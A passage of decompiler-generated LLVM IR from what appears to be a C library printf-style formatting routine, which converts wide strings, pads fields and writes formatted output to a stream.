  %v2_13dfc = icmp eq i32 %v5_13e0c, 0
  br i1 %v2_13dfc, label %bb172, label %dec_label_pc_13e08

bb172:                                            ; preds = %dec_label_pc_13dfc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13e14

dec_label_pc_13e08:                               ; preds = %dec_label_pc_13dfc, %bb169
  %v2_13e08 = sub i32 %v5_13e0c, %v2_13d94
  %tmp211 = icmp ugt i32 %v5_13e0c, %v2_13d94
  br i1 %tmp211, label %.thread85, label %dec_label_pc_13e14

.thread85:                                        ; preds = %dec_label_pc_13e08
  store i32 %v2_13e08, i32* @r8, align 4
  br label %dec_label_pc_14020thread-pre-split

dec_label_pc_13e14:                               ; preds = %dec_label_pc_13e08, %.thread27, %bb172
  %v1_14024.pre205 = phi i32 [ %v2_13d94, %dec_label_pc_13e08 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_14020thread-pre-split

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13c80
  br i1 %tmp208, label %dec_label_pc_13e5c, label %dec_label_pc_13e24

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13e1c
  %v3_13e34 = load i32, i32* %stack_var_-72, align 4
  %v0_13e38 = load i32, i32* @fp, align 4
  store i32 %v0_13e38, i32* %r0.global-to-local, align 4
  %v1_13e3c = inttoptr i32 %v3_13e34 to i32*
  %v2_13e3c = load i32, i32* %v1_13e3c, align 4
  store i32 %v2_13e3c, i32* %r2.global-to-local, align 4
  %v3_13e3c = add i32 %v3_13e34, 4
  %v4_13e3c = inttoptr i32 %v3_13e3c to i32*
  %v5_13e3c = load i32, i32* %v4_13e3c, align 4
  %v8_13e40 = call i32 @_fpmaxtostr(i32 %v0_13e38, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -91596) to i64) to double), i32 %v2_13e3c, i32 %v5_13e3c, i32 %v2_13fd0, i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -91596))
  store i32 %v8_13e40, i32* %r0.global-to-local, align 4
  %v1_13e44 = icmp slt i32 %v8_13e40, 0
  br i1 %v1_13e44, label %dec_label_pc_14178, label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e24
  %v2_13e50 = add i32 %v8_13e40, %v1_14050
  store i32 %v2_13e50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14164

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e1c
  br i1 %v3_13e60, label %dec_label_pc_13ee4, label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e5c
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_13e6c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_13e6c, i32* %r0.global-to-local, align 4
  br i1 %v7_13e5c, label %dec_label_pc_13e74, label %dec_label_pc_13eac

dec_label_pc_13e74:                               ; preds = %dec_label_pc_13e64
  %v1_13e74 = inttoptr i32 %v3_13e6c to i32*
  %v2_13e74 = load i32, i32* %v1_13e74, align 4
  %v9_13e78 = icmp eq i32 %v2_13e74, 0
  store i32 %v2_13e74, i32* %stack_var_-44, align 4
  br i1 %v9_13e78, label %dec_label_pc_13f24, label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e74
  %v3_13e84 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_13e88, i32* @r0, align 4
  %v4_13e8c = ashr i32 %v3_13e84, 31
  %v5_13e8c = or i32 %v4_13e8c, %v3_13e84
  store i32 %v5_13e8c, i32* %r2.global-to-local, align 4
  store i32 %v2_13e88, i32* @r1, align 4
  %v6_13e98 = call i32 @__GI_wcsrtombs(i32 %v2_13e88, i32 %v2_13e88, i32 %v5_13e8c, i32 %v2_13e94, i32 0, i32 %v2_13e74)
  store i32 %v6_13e98, i32* %r0.global-to-local, align 4
  %v3_13e9c = icmp eq i32 %v6_13e98, -1
  store i32 %v6_13e98, i32* @r5, align 4
  br i1 %v3_13e9c, label %dec_label_pc_14178, label %dec_label_pc_14010

dec_label_pc_13eac:                               ; preds = %dec_label_pc_13e64
  store i32 %v2_13f8c, i32* %r7.global-to-local, align 4
  %v1_13eb0 = inttoptr i32 %v3_13e6c to i32*
  %v2_13eb0 = load i32, i32* %v1_13eb0, align 4
  store i32 %v2_13e94, i32* %r2.global-to-local, align 4
  store i32 %v2_13f8c, i32* %r0.global-to-local, align 4
  %v5_13ebc = call i32 @__GI_wcrtomb(i32 %v2_13f8c, i32 %v2_13eb0, i32 %v2_13e94, i32 %tmp105, i32 0)
  store i32 %v5_13ebc, i32* %r0.global-to-local, align 4
  %v7_13ec0 = icmp eq i32 %v5_13ebc, -1
  store i32 %v5_13ebc, i32* @r5, align 4
  br i1 %v7_13ec0, label %dec_label_pc_14178, label %dec_label_pc_13ecc

dec_label_pc_13ecc:                               ; preds = %dec_label_pc_13eac
  %v0_13ecc = load i32, i32* @sl, align 4
  store i32 %v0_13ecc, i32* @r8, align 4
  store i32 %v2_13f8c, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_13edc = trunc i32 %v0_13ecc to i8
  %v2_13edc = load i32, i32* %r7.global-to-local, align 4
  %v4_13edc = add i32 %v2_13edc, %v5_13ebc
  %v5_13edc = inttoptr i32 %v4_13edc to i8*
  store i8 %v1_13edc, i8* %v5_13edc, align 1
  %v0_14024.pre.pre = load i32, i32* @r8, align 4
  %v1_14024.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14020thread-pre-split

dec_label_pc_13ee4:                               ; preds = %dec_label_pc_13e5c
  br i1 %v3_13ee8, label %dec_label_pc_13f80, label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13ee4
  %v3_13eec = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_13eec, i32* %r0.global-to-local, align 4
  %v1_13ef4 = inttoptr i32 %v3_13eec to i32*
  %v2_13ef4 = load i32, i32* %v1_13ef4, align 4
  br i1 %v7_13ee4, label %dec_label_pc_13ef4, label %dec_label_pc_13f58

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13eec
  store i32 %v2_13ef4, i32* @r4, align 4
  %v2_13ef8 = icmp eq i32 %v2_13ef4, 0
  br i1 %v2_13ef8, label %dec_label_pc_13f24, label %dec_label_pc_13f00

dec_label_pc_13f00:                               ; preds = %dec_label_pc_13ef4, %dec_label_pc_13f88
  %v0_13f04 = phi i32 [ %v2_13ef4, %dec_label_pc_13ef4 ], [ %v3_13f98, %dec_label_pc_13f88 ]
  %v3_13f00 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_13f04, i32* %r0.global-to-local, align 4
  %v4_13f08 = ashr i32 %v3_13f00, 31
  %v5_13f08 = or i32 %v4_13f08, %v3_13f00
  %v2_13f0c = inttoptr i32 %v0_13f04 to i8*
  %v3_13f0c = call i32 @strnlen(i8* %v2_13f0c, i32 %v5_13f08)
  store i32 %v3_13f0c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_13f0c, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_14020

dec_label_pc_13f24:                               ; preds = %dec_label_pc_13ef4, %dec_label_pc_13e74
  %v3_13f24 = load i32, i32* %stack_var_-348, align 4
  %v1_13f28 = icmp slt i32 %v3_13f24, 0
  br i1 %v1_13f28, label %dec_label_pc_13f40, label %dec_label_pc_13f30

dec_label_pc_13f30:                               ; preds = %dec_label_pc_13f24
  %tmp212 = icmp ult i32 %v3_13f24, 6
  br i1 %tmp212, label %dec_label_pc_13f48, label %dec_label_pc_13f40

dec_label_pc_13f40:                               ; preds = %dec_label_pc_13f30, %dec_label_pc_13f24
  br label %dec_label_pc_13f48

dec_label_pc_13f48:                               ; preds = %dec_label_pc_13f30, %dec_label_pc_13f40
  %storemerge97 = phi i32 [ 6, %dec_label_pc_13f40 ], [ 0, %dec_label_pc_13f30 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38476), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_14020

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13eec
  store i32 %v2_13ef4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_13f8c, i32* @r4, align 4
  store i32 %v2_13ef4, i32* %stack_var_-200, align 4
  br label %dec_label_pc_14020thread-pre-split

dec_label_pc_13f80:                               ; preds = %dec_label_pc_13ee4
  br i1 %v7_13f80, label %dec_label_pc_13f88, label %dec_label_pc_13fa4

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f80
  %v0_13f88 = call i32 @__GI___errno_location()
  store i32 %v0_13f88, i32* %r0.global-to-local, align 4
  %v1_13f90 = inttoptr i32 %v0_13f88 to i32*
  %v2_13f90 = load i32, i32* %v1_13f90, align 4
  store i32 %v2_13f90, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_13f98 = call i32 @__GI___glibc_strerror_r(i32 %v2_13f90, i32 %v2_13f8c, i32 128)
  store i32 %v3_13f98, i32* %r0.global-to-local, align 4
  store i32 %v3_13f98, i32* @r4, align 4
  br label %dec_label_pc_13f00

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13f80
  %v4_13fac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 1004) to i32*), align 4
  %v1_13fb4 = add i32 %v4_13fac, 10
  store i32 %v1_13fb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13fb8

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_14000, %dec_label_pc_13fa4
  %v1_13fc8 = phi i32 [ %v1_14000, %dec_label_pc_14000 ], [ %v4_13fac, %dec_label_pc_13fa4 ]
  %v1_13fb8 = inttoptr i32 %v1_13fc8 to i8*
  %v2_13fb8 = load i8, i8* %v1_13fb8, align 1
  %v3_13fb8 = zext i8 %v2_13fb8 to i32
  store i32 %v3_13fb8, i32* %r2.global-to-local, align 4
  %v9_13fc0 = icmp eq i32 %v3_13fb8, %tmp99
  br i1 %v9_13fc0, label %dec_label_pc_13fc8, label %dec_label_pc_14000

dec_label_pc_13fc8:                               ; preds = %dec_label_pc_13fb8
  %v2_13fc8 = sub i32 %v1_13fc8, %v4_13fac
  %v0_13fcc = load i32, i32* @fp, align 4
  store i32 %v0_13fcc, i32* %r0.global-to-local, align 4
  store i32 %v2_13fd4, i32* %r2.global-to-local, align 4
  %v4_13fdc = mul i32 %v2_13fc8, 4
  %v5_13fdc = add i32 %v4_13fdc, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 26548)
  %v6_13fdc = inttoptr i32 %v5_13fdc to i32*
  %v7_13fdc = load i32, i32* %v6_13fdc, align 4
  store i32 %v7_13fdc, i32* @ip, align 4
  store i32 81896, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_13fdc)
  %v0_13fe8 = load i32, i32* %r0.global-to-local, align 4
  %v1_13fe8 = icmp slt i32 %v0_13fe8, 0
  br i1 %v1_13fe8, label %dec_label_pc_14178, label %dec_label_pc_13ff0

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_13fc8
  %v2_13ff4 = add i32 %v0_13fe8, %v1_14050
  br label %dec_label_pc_14164

dec_label_pc_14000:                               ; preds = %dec_label_pc_13fb8
  %v1_14000 = add i32 %v1_13fc8, 1
  %v3_14004 = icmp ult i32 %v1_14000, %v1_13fb4
  br i1 %v3_14004, label %dec_label_pc_13fb8, label %dec_label_pc_14178

dec_label_pc_14010:                               ; preds = %dec_label_pc_13e84
  %v0_14010 = load i32, i32* @sl, align 4
  store i32 %v0_14010, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_14010, i32* @r4, align 4
  br label %dec_label_pc_14020

dec_label_pc_14020thread-pre-split:               ; preds = %.thread85, %dec_label_pc_13e14, %dec_label_pc_13ecc, %dec_label_pc_13f58
  %v1_14024.pre = phi i32 [ %v1_14024.pre205, %dec_label_pc_13e14 ], [ %v1_14024.pre.pre, %dec_label_pc_13ecc ], [ 1, %dec_label_pc_13f58 ], [ %v2_13d94, %.thread85 ]
  %v0_14024.pre = phi i32 [ 0, %dec_label_pc_13e14 ], [ %v0_14024.pre.pre, %dec_label_pc_13ecc ], [ 0, %dec_label_pc_13f58 ], [ %v2_13e08, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_13d88, %dec_label_pc_13e14 ], [ %v0_13cb8, %dec_label_pc_13ecc ], [ %v0_13cb8, %dec_label_pc_13f58 ], [ %v0_13d88, %.thread85 ]
  %v0_14020.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %dec_label_pc_14020thread-pre-split, %dec_label_pc_13f48, %dec_label_pc_13f00, %dec_label_pc_14010
  %v1_14024 = phi i32 [ %v1_14024.pre, %dec_label_pc_14020thread-pre-split ], [ %storemerge97, %dec_label_pc_13f48 ], [ %v3_13f0c, %dec_label_pc_13f00 ], [ %v6_13e98, %dec_label_pc_14010 ]
  %v0_14024 = phi i32 [ %v0_14024.pre, %dec_label_pc_14020thread-pre-split ], [ 0, %dec_label_pc_13f48 ], [ 0, %dec_label_pc_13f00 ], [ %v0_14010, %dec_label_pc_14010 ]
  %v0_1402c = phi i32 [ %v0_14020.pr, %dec_label_pc_14020thread-pre-split ], [ 11, %dec_label_pc_13f48 ], [ 11, %dec_label_pc_13f00 ], [ 11, %dec_label_pc_14010 ]
  %v0_1406c = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_14020thread-pre-split ], [ %v0_13cb8, %dec_label_pc_13f48 ], [ %v0_13cb8, %dec_label_pc_13f00 ], [ %v0_13cb8, %dec_label_pc_14010 ]
  %v7_14020 = icmp eq i32 %v0_1402c, 11
  %v2_14024 = add i32 %v1_14024, %v0_14024
  br i1 %v7_14020, label %dec_label_pc_1403c, label %bb173

bb173:                                            ; preds = %dec_label_pc_14020
  %v7_14034 = icmp sgt i32 %v0_1402c, 5
  %. = select i1 %v7_14034, i32 2, i32 1
  %v2_14038 = add i32 %v2_14024, %.
  br label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %dec_label_pc_14020, %bb173
  %v0_14050 = phi i32 [ %v2_14024, %dec_label_pc_14020 ], [ %v2_14038, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_14040 = icmp uge i32 %tmp98, %v0_14050
  %v9_14040 = icmp eq i32 %tmp98, %v0_14050
  %v2_14044 = xor i1 %v9_14040, true
  %v3_14044 = and i1 %v3_14040, %v2_14044
  br i1 %v3_14044, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_1403c
  %v2_14040 = sub i32 %tmp98, %v0_14050
  store i32 %v2_14040, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_1403c, %bb174
  store i32 %v1_14050, i32* %r2.global-to-local, align 4
  %v2_1404c = xor i1 %v3_14040, true
  %v3_1404c = or i1 %v9_14040, %v2_1404c
  br i1 %v3_1404c, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_14054.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_14064 = phi i32 [ %v1_14054.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_14050 = add i32 %v0_14050, %v1_14050
  %v2_14054 = add i32 %v2_14050, %v2_14064
  %v0_14060 = load i32, i32* @sb, align 4
  %v7_14060 = icmp eq i32 %v0_14060, 48
  br i1 %v7_14060, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_14064 = add i32 %v2_14064, %v0_14024
  store i32 %v3_14064, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_1407c = phi i32 [ %v2_14064, %bb177 ], [ 0, %bb178 ]
  %v1_1406c = and i32 %v0_1406c, 8
  store i32 %v1_1406c, i32* @r7, align 4
  %v2_1406c = icmp eq i32 %v1_1406c, 0
  br i1 %v2_1406c, label %dec_label_pc_14074, label %dec_label_pc_14090

dec_label_pc_14074:                               ; preds = %.thread30
  %v0_14074 = load i32, i32* @fp, align 4
  store i32 %v0_14074, i32* %r0.global-to-local, align 4
  store i32 %v0_1407c, i32* %r2.global-to-local, align 4
  %v4_14080 = call i32 @_charpad(i32 %v0_14074, i8 32, i32 %v0_1407c)
  store i32 %v4_14080, i32* %r0.global-to-local, align 4
  %v1_14084 = load i32, i32* @sl, align 4
  %v9_14084 = icmp eq i32 %v4_14080, %v1_14084
  br i1 %v9_14084, label %dec_label_pc_1408c, label %dec_label_pc_14178

dec_label_pc_1408c:                               ; preds = %dec_label_pc_14074
  %v0_1408c = load i32, i32* @r7, align 4
  store i32 %v0_1408c, i32* @sl, align 4
  %v0_14098.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14090

dec_label_pc_14090:                               ; preds = %.thread30, %dec_label_pc_1408c
  %v0_14098 = phi i32 [ %v0_1402c, %.thread30 ], [ %v0_14098.pre, %dec_label_pc_1408c ]
  %v0_14094 = load i32, i32* @fp, align 4
  %v2_14098 = add i32 %v0_14098, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38468)
  store i32 %v2_14098, i32* %r0.global-to-local, align 4
  %v2_1409c = inttoptr i32 %v2_14098 to i8*
  %v3_1409c = call i32 @__GI_fputs_unlocked(i8* %v2_1409c, i32 %v0_14094)
  %v0_140a0 = load i32, i32* @fp, align 4
  store i32 %v0_140a0, i32* %r0.global-to-local, align 4
  %v0_140a8 = load i32, i32* @r8, align 4
  store i32 %v0_140a8, i32* %r2.global-to-local, align 4
  %v4_140ac = call i32 @_charpad(i32 %v0_140a0, i8 48, i32 %v0_140a8)
  store i32 %v4_140ac, i32* %r0.global-to-local, align 4
  %v1_140b0 = load i32, i32* @r8, align 4
  %v9_140b0 = icmp eq i32 %v4_140ac, %v1_140b0
  br i1 %v9_140b0, label %dec_label_pc_140b8, label %dec_label_pc_14178

dec_label_pc_140b8:                               ; preds = %dec_label_pc_14090
  %v3_140b8 = load i32, i32* %stack_var_-44, align 4
  %v2_140bc = icmp eq i32 %v3_140b8, 0
  br i1 %v2_140bc, label %dec_label_pc_140c4, label %dec_label_pc_140e8

dec_label_pc_140c4:                               ; preds = %dec_label_pc_140b8
  %v0_140c4 = load i32, i32* @r5, align 4
  %v2_140c4 = icmp eq i32 %v0_140c4, 0
  br i1 %v2_140c4, label %dec_label_pc_1414c, label %dec_label_pc_140cc

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140c4
  %v0_140cc = load i32, i32* @r4, align 4
  store i32 %v0_140cc, i32* %r0.global-to-local, align 4
  %v0_140d4 = load i32, i32* @fp, align 4
  store i32 %v0_140d4, i32* %r2.global-to-local, align 4
  %v3_140d8 = inttoptr i32 %v0_140d4 to i16*
  %v4_140d8 = call i32 @__stdio_fwrite(i32 %v0_140cc, i32 %v0_140c4, i16* %v3_140d8)
  store i32 %v4_140d8, i32* %r0.global-to-local, align 4
  %v1_140dc = load i32, i32* @r5, align 4
  %v9_140dc = icmp eq i32 %v4_140d8, %v1_140dc
  br i1 %v9_140dc, label %dec_label_pc_1414c, label %dec_label_pc_14178

dec_label_pc_140e8:                               ; preds = %dec_label_pc_140b8
  store i32 %v2_13f8c, i32* @r6, align 4
  store i32 %v2_13e88, i32* @r8, align 4
  store i32 %v2_13e94, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_14138.pr = load i32, i32* @r5, align 4
  %v2_1413841 = icmp eq i32 %v0_14138.pr, 0
  store i32 %v2_13e88, i32* @r1, align 4
  store i32 %v2_13f8c, i32* @r0, align 4
  br i1 %v2_1413841, label %dec_label_pc_1414c, label %dec_label_pc_14100

dec_label_pc_14100:                               ; preds = %dec_label_pc_140e8, %dec_label_pc_14134
  %v1_14104 = phi i32 [ %v2_14134, %dec_label_pc_14134 ], [ %v0_14138.pr, %dec_label_pc_140e8 ]
  %v2_14100 = icmp ult i32 %v1_14104, 128
  %.v1_14104 = select i1 %v2_14100, i32 %v1_14104, i32 128
  store i32 %.v1_14104, i32* %r2.global-to-local, align 4
  %v6_1410c = call i32 @__GI_wcsrtombs(i32 %v2_13f8c, i32 %v2_13e88, i32 %.v1_14104, i32 %v2_13e94, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_1410c, i32* @r4, align 4
  %v2_14110 = icmp eq i32 %v6_1410c, 0
  store i32 %v6_1410c, i32* %r0.global-to-local, align 4
  br i1 %v2_14110, label %dec_label_pc_14134, label %dec_label_pc_1411c

dec_label_pc_1411c:                               ; preds = %dec_label_pc_14100
  store i32 %v2_13f8c, i32* %r0.global-to-local, align 4
  %v0_14124 = load i32, i32* @fp, align 4
  store i32 %v0_14124, i32* %r2.global-to-local, align 4
  %v3_14128 = inttoptr i32 %v0_14124 to i16*
  %v4_14128 = call i32 @__stdio_fwrite(i32 %v2_13f8c, i32 %v6_1410c, i16* %v3_14128)
  store i32 %v4_14128, i32* %r0.global-to-local, align 4
  %v1_1412c = load i32, i32* @r4, align 4
  %v9_1412c = icmp eq i32 %v4_14128, %v1_1412c
  br i1 %v9_1412c, label %dec_label_pc_14134, label %dec_label_pc_14178

dec_label_pc_14134:                               ; preds = %dec_label_pc_1411c, %dec_label_pc_14100
  %v0_14134 = phi i32 [ %v4_14128, %dec_label_pc_1411c ], [ 0, %dec_label_pc_14100 ]
  %v1_14134 = load i32, i32* @r5, align 4
  %v2_14134 = sub i32 %v1_14134, %v0_14134
  store i32 %v2_14134, i32* @r5, align 4
  %v2_14138 = icmp eq i32 %v2_14134, 0
  store i32 %v2_13e88, i32* @r1, align 4
  store i32 %v2_13f8c, i32* @r0, align 4
  br i1 %v2_14138, label %dec_label_pc_1414c, label %dec_label_pc_14100

dec_label_pc_1414c:                               ; preds = %dec_label_pc_14134, %dec_label_pc_140e8, %dec_label_pc_140cc, %dec_label_pc_140c4
  %v0_1414c = load i32, i32* @fp, align 4
  store i32 %v0_1414c, i32* %r0.global-to-local, align 4
  %v0_14154 = load i32, i32* @sl, align 4
  store i32 %v0_14154, i32* %r2.global-to-local, align 4
  %v4_14158 = call i32 @_charpad(i32 %v0_1414c, i8 32, i32 %v0_14154)
  store i32 %v4_14158, i32* %r0.global-to-local, align 4
  %v1_1415c = load i32, i32* @sl, align 4
  %v9_1415c = icmp eq i32 %v4_14158, %v1_1415c
  br i1 %v9_1415c, label %dec_label_pc_14164, label %dec_label_pc_14178

dec_label_pc_14164:                               ; preds = %dec_label_pc_1414c, %dec_label_pc_13ff0, %dec_label_pc_13e4c, %dec_label_pc_13c5c
  %stack_var_-336.4 = phi i32 [ %v0_13cb8, %dec_label_pc_13c5c ], [ %v0_1406c, %dec_label_pc_1414c ], [ %v0_13cb8, %dec_label_pc_13ff0 ], [ %v0_13cb8, %dec_label_pc_13e4c ]
  %stack_var_-356.3 = phi i32 [ %v1_14050, %dec_label_pc_13c5c ], [ %v2_14054, %dec_label_pc_1414c ], [ %v2_13ff4, %dec_label_pc_13ff0 ], [ %v2_13e50, %dec_label_pc_13e4c ]
  %v3_14164 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_14164, i32* @r4, align 4
  store i32 %v3_14164, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b84.outer

dec_label_pc_14170:                               ; preds = %dec_label_pc_13be0
  %v1_14170 = add i32 %v0_13be8, 2
  store i32 %v1_14170, i32* @r4, align 4
  br label %dec_label_pc_13b84.outer36

dec_label_pc_14178:                               ; preds = %dec_label_pc_14000, %dec_label_pc_13e84, %dec_label_pc_1414c, %dec_label_pc_140cc, %dec_label_pc_14090, %dec_label_pc_14074, %dec_label_pc_13fc8, %dec_label_pc_13eac, %dec_label_pc_13e24, %bb142, %dec_label_pc_1411c
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_14180

dec_label_pc_14180:                               ; preds = %dec_label_pc_13bd4, %bb, %dec_label_pc_13b18, %dec_label_pc_14178
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_13b18 ], [ -1, %dec_label_pc_14178 ], [ %v1_14050, %dec_label_pc_13bd4 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_13ac8, i32* @r5, align 4
  store i32 %v12_13ac8, i32* %r7.global-to-local, align 4
  store i32 %v18_13ac8, i32* @sb, align 4
  store i32 %v21_13ac8, i32* @sl, align 4
  store i32 %v24_13ac8, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_14170, { 1, 0 }
  uselistorder i32 %v3_14164, { 1, 2, 0 }
  uselistorder i32 %v2_14134, { 1, 2, 0 }
  uselistorder i32 %v0_1407c, { 1, 0 }
  uselistorder i32 %v2_14064, { 2, 0, 1 }
  uselistorder i1 %v9_14040, { 1, 0 }
  uselistorder i32 %v2_14024, { 1, 0 }
  uselistorder i32 %v0_1406c, { 1, 0 }
  uselistorder i32 %v0_14024, { 1, 0 }
  uselistorder i32 %v1_14000, { 1, 0 }
  uselistorder i32 %v1_13fc8, { 1, 0, 2 }
  uselistorder i32 %v3_13f98, { 1, 2, 0 }
  uselistorder i32 %v0_13f04, { 1, 0 }
  uselistorder i32 %v2_13ef4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_13ebc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_13e34, { 1, 0 }
  uselistorder i32 %v2_13d94, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_13db0, { 1, 2, 3, 0 }
  uselistorder i32 %v2_13d30, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_13c98, { 0, 2, 1, 3 }
  uselistorder i32 %v1_13c3c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_13c34, { 1, 0 }
  uselistorder i32 %v1_13be0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_14050, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_13ba0, { 1, 0 }
  uselistorder i32 %v1_13b98.lcssa, { 1, 0 }
  uselistorder i8 %v2_13b84, { 1, 0 }
  uselistorder i32 %v2_13b98, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_13bb0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13cb8, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_13da8, { 1, 0 }
  uselistorder i1 %v7_13cf8, { 1, 2, 0 }
  uselistorder i1 %v7_13ee4, { 1, 0 }
  uselistorder i1 %v7_13e5c, { 1, 0 }
  uselistorder i1 %v7_13d38, { 1, 0 }
  uselistorder i32 %v2_13e94, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_13e88, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_13f8c, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_13c38, { 1, 3, 2, 0 }
  uselistorder i32 %v4_13c14, { 1, 0 }
  uselistorder i32 %v2_13ad0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 20, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 30, 31, 25, 26, 27, 28, 29, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 5, 8, 7, 9, 11, 10, 16, 12, 13, 14, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 32, 30, 31, 35, 36, 33, 34, 46, 37, 47, 48, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -91596), { 1, 0 }
  uselistorder label %dec_label_pc_14180, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14178, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_14100, { 1, 0 }
  uselistorder label %dec_label_pc_14090, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_1403c, { 1, 0 }
  uselistorder label %dec_label_pc_14020, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_14020thread-pre-split, { 3, 2, 1, 0 }
